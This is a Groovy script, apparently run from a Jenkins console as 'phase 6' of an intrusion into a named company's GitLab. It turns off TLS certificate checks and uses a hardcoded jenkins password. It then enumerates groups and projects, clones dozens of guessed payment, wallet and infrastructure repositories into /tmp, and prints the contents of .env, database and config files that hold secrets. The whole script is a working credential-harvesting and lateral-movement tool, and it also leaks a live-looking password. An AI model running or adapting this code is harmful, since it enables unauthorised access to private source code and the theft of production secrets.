// PHASE 6: Read cloned caja-pagos-api + enumerate ALL GitLab repos + clone all relevant
// Key: jenkins user can git clone HTTPS repos!

import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
import javax.net.ssl.*
import java.security.cert.*

// Install trust-all SSL
def tm = [new X509TrustManager() {
    void checkClientTrusted(X509Certificate[] c, String a) {}
    void checkServerTrusted(X509Certificate[] c, String a) {}
    X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0] }
}] as TrustManager[]
def sc = SSLContext.getInstance("TLS")
sc.init(null, tm, new java.security.SecureRandom())
HttpsURLConnection.setDefaultSSLSocketFactory(sc.socketFactory)
HttpsURLConnection.setDefaultHostnameVerifier { h, s -> true }

def user = "jenkins"
def pass = "e6LBqIkOI\$PR1XX2oia"
def passEnc = java.net.URLEncoder.encode(pass, "UTF-8")
def glBase = "https://gitlab.dev.claroshop.com"
def cloneBase = glBase.replace("https://", "https://${user}:${passEnc}@")

def gitClone = { repoPath ->
    def dest = "/tmp/gl_${repoPath.replace('/', '_')}"
    def f = new File(dest)
    if (f.exists() && f.list()?.length > 1) return [success: true, dest: dest, files: f.list()]
    ["bash","-c","rm -rf '${dest}'"].execute().waitFor()
    def cloneUrl = "${cloneBase}/${repoPath}.git"
    def proc = ["bash","-c","GIT_TERMINAL_PROMPT=0 git -c http.sslVerify=false clone --depth=1 '${cloneUrl}' '${dest}' 2>&1"].execute()
    proc.waitForOrKill(45000)
    def out = proc.text?.take(200)?:""
    def success = new File(dest).exists() && new File(dest).list()?.length > 1
    return [success: success, dest: dest, files: new File(dest).list(), err: out]
}

def readSensitive = { destDir ->
    def results = [:]
    def patterns = [
        "config/local.php", "config/autoload/local.php", "config/database.yml",
        ".env", ".env.production", ".env.local", ".env.prod",
        "docker-compose.yml", "docker-compose.prod.yml",
        "config/app.php", "app/config/database.php", "app/config/app.php",
        ".env.example", "config/config.php", "application/config/database.php",
    ]
    patterns.each { p ->
        def f = new File("${destDir}/${p}")
        if (f.exists()) {
            results[p] = f.text.take(5000)
        }
    }
    // Also recurse for .env files
    new File(destDir).eachFileRecurse { f2 ->
        def name = f2.name.toLowerCase()
        if ((name == ".env" || name == "local.php" || name == "database.yml") && !results.containsKey(f2.name)) {
            def rel = f2.absolutePath.replace(destDir, "").replaceFirst("^/","")
            if (!results.containsKey(rel)) results[rel] = f2.text.take(5000)
        }
    }
    return results
}

// ===== PART 1: Read already cloned caja-pagos-api =====
println "=== PART 1: READ caja-pagos-api ==="
def cajaDir = "/tmp/gl_clone_claroshop_caja-pagos-api"
def cajaFiles = readSensitive(cajaDir)
if (cajaFiles) {
    cajaFiles.each { fname, content ->
        println "\n  >> FILE: ${fname}"
        println content
        println "  << END ${fname}"
    }
} else {
    println "  No sensitive files found. Listing config/:"
    new File("${cajaDir}/config").listFiles()?.each { f -> println "    ${f.name}" }
    new File("${cajaDir}/module").listFiles()?.take(10)?.each { f -> println "    module/${f.name}" }
}

// ===== PART 2: Enumerate all repos via GitLab web HTML =====
println "\n=== PART 2: ENUMERATE ALL GROUPS VIA WEB ==="
def enc = (user + ":" + pass).bytes.encodeBase64().toString()

// Get all groups
def getPage = { url ->
    try {
        def conn = new URL(url).openConnection()
        conn.connectTimeout = 10000; conn.readTimeout = 15000
        conn.setRequestProperty("Authorization", "Basic " + enc)
        conn.setInstanceFollowRedirects(true)
        def code = conn.responseCode
        def body = (code < 400 ? conn.inputStream : conn.errorStream)?.text?:""
        return [code: code, body: body]
    } catch(e) { return [code: 0, body: e.message?.take(80)] }
}

// GitLab web interface - list explore/groups
def groups = [] as Set
def repos = [] as Set

// Try getting groups list
def r = getPage(glBase + "/explore/groups?visibility=private")
println "  /explore/groups: [${r.code}]"
if (r.code == 200) {
    (r.body =~ /href="\/([^"\/]+)"/).each { m ->
        def g = m[1]
        if (!g.startsWith("users") && !g.startsWith("dashboard") && g.length() > 1) {
            groups << g
        }
    }
}

// Try REST API with sudo param or admin token
// First check version
def rVer = getPage(glBase + "/api/v4/version")
println "  /api/v4/version: [${rVer.code}] ${rVer.body.take(100)}"

// Try different endpoint format
def rMem = getPage(glBase + "/api/v4/projects?membership=true&per_page=100")
println "  /api/v4/projects?membership: [${rMem.code}] ${rMem.body.take(200)}"

def rAll = getPage(glBase + "/api/v4/projects?visibility=private&per_page=100")
println "  /api/v4/projects?visibility=private: [${rAll.code}] ${rAll.body.take(200)}"

// ===== PART 3: Try cloning many known repos =====
println "\n=== PART 3: CLONE ALL KNOWN RELEVANT REPOS ==="
def knownRepos = [
    // caja/payment
    "claroshop/caja-pagos-api",
    "claroshop/caja-api",
    "claroshop/payment-api",
    "claroshop/payment-service",
    "claroshop/payment-processor",
    "claroshop/claropay-api",
    "claroshop/claropay",
    // sears
    "sears/sears-api",
    "sears/sears-app",
    "sears/mesa-regalo-api",
    "sears/sears-pagos",
    "sears/sears-caja",
    // t1pagos
    "t1pagos/t1pagos-api",
    "t1pagos/payment-api",
    "t1pagos/t1",
    // tienda / monedero
    "claroshop/tienda",
    "claroshop/tienda-api",
    "claroshop/monedero",
    "claroshop/monedero-api",
    "claroshop/axii-api",
    "claroshop/axii",
    // microservices
    "claroshop/ms-payment",
    "claroshop/ms-caja",
    "claroshop/microservices",
    // locales
    "locales/Locales",
    // infracode
    "infracode/claroshop",
    "infracode/pipeline",
    "claroshop/infracode",
]

def clonedRepos = []
knownRepos.each { repo ->
    def result = gitClone(repo)
    if (result.success) {
        println "  CLONED: ${repo} -> ${result.files?.join(',')?.take(100)}"
        clonedRepos << [repo: repo, dest: result.dest]
    }
}

println "\n  SUCCESSFULLY CLONED (${clonedRepos.size()}):"
clonedRepos.each { r2 -> println "    ${r2.repo}" }

// ===== PART 4: Read sensitive files from all cloned repos =====
println "\n=== PART 4: SENSITIVE FILES FROM ALL CLONES ==="
clonedRepos.each { r2 ->
    def sensitive = readSensitive(r2.dest)
    if (sensitive) {
        println "\n  ===== REPO: ${r2.repo} ====="
        sensitive.each { fname, content ->
            println "\n  >> ${fname}:"
            println content
            println "  <<"
        }
    }
}

println "\n=== DONE PHASE 6 ==="
